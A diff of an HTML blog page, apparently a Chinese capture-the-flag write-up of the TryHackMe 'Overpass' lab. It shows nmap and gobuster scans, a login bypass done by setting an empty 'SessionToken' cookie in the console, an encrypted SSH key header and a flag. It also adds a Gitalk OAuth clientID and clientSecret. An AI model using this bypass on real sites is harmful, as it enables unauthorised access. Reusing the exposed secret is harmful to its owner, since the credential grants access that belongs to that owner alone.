@@ -236,7 +236,14 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 46.80 seconds
 </code></pre>
-<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p><img src="/2022/05/05/Overpass/image.png" alt="image"></p>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
 <p>没什么有用的东西，去 FUZZ 一下</p>
 <h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
 └─# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -261,7 +268,14 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 /css                  (Status: 301) [Size: 0] [--&gt; css/]
 </code></pre>
 <p>有一个 &#x2F;admin 目录，进去看一下</p>
-<p><img src="/2022/05/05/Overpass/image1.png" alt="image"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image1.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
 <p>一个登陆页面，使用弱口令没有进去，看一下源代码</p>
 <p>在页面 <a href="http://10.10.29.27/login.js" target="_blank" rel="noopener">http://10.10.29.27/login.js</a> 中找到了一句</p>
 <pre><code class="bash">Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
@@ -271,13 +285,27 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 </code></pre>
 <p>这里应该是 Cookie 设置绕过</p>
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>按 F12 打开控制台</p>
-<p><img src="/2022/05/05/Overpass/image2.png" alt="image"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image2.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
 <p>这里也确实输出了 “Hello, World”</p>
 <p>这里修改我们的 Payload</p>
 <pre><code class="bash">Cookies.set(&quot;SessionToken&quot;, &quot;&quot;)
 </code></pre>
 <p>在控制台输入以后，刷新</p>
-<p><img src="/2022/05/05/Overpass/image3.png" alt="image"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image3.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
 <p>直接绕过了登陆机制，拿到了用户 james 的 sshkey</p>
 <pre><code class="bash">-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -588,11 +616,11 @@ thm{7f336f8c359dbac18d54fdd64ea753bb}
           id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
         }
         const gitalk = new Gitalk({
-          clientID: '',
-          clientSecret: '',
-          repo: '',
-          owner: '',
-          admin: [''],
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
           id: id,      // Ensure uniqueness and length less than 50
           title: document.title.split('|')[0],
           distractionFreeMode: false  // Facebook-like distraction free mode
